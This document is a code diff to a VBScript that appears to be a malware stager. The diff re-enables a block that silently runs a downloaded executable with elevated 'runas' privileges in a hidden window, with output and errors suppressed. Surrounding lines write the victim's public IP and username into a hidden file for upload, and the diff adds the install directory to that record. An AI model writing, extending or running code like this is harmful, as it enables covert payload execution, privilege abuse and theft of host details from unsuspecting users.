@@ -92,25 +92,25 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
         End If
     Next
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    ' ' Set the file name to execute
-    ' strExecutableFileName = "target_script.exe" ' The name of the file to execute
+    ' Set the file name to execute
+    strExecutableFileName = "target_script.exe" ' The name of the file to execute
 
-    ' ' Loop through downloaded files and check if it's the one we need to execute
-    ' For Each arrFile In arrFiles
-    '     strLocalFile = arrFile(1)
-    '     If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
-    '         strLocalPath = strMainFolderPath & "\" & strLocalFile
+    ' Loop through downloaded files and check if it's the one we need to execute
+    For Each arrFile In arrFiles
+        strLocalFile = arrFile(1)
+        If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
+            strLocalPath = strMainFolderPath & "\" & strLocalFile
 
-    '         ' Execute the downloaded file
-    '         objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strMainFolderPath, "runas", 0
-    '         If Err.Number <> 0 Then
-    '             'WScript.Echo "Error running downloaded file: " & Err.Description
-    '             Err.Clear
-    '         Else
-    '             'WScript.Echo "Downloaded file executed."
-    '         End If
-    '     End If
-    ' Next
+            ' Execute the downloaded file
+            objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strMainFolderPath, "runas", 0
+            If Err.Number <> 0 Then
+                'WScript.Echo "Error running downloaded file: " & Err.Description
+                Err.Clear
+            Else
+                'WScript.Echo "Downloaded file executed."
+            End If
+        End If
+    Next
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
@@ -146,6 +146,7 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
     objFSO.GetFile(strMainFolderPath & "\details.txt").Attributes = 2 ' 2 = Hidden attribute
 
     objFile.WriteLine "IP: " & strPublicIP & " User: " & strUsername
+    objFile.WriteLine "MainDir: " & strMainFolderPath
     objFile.Close
 
     ' Upload the details.txt file
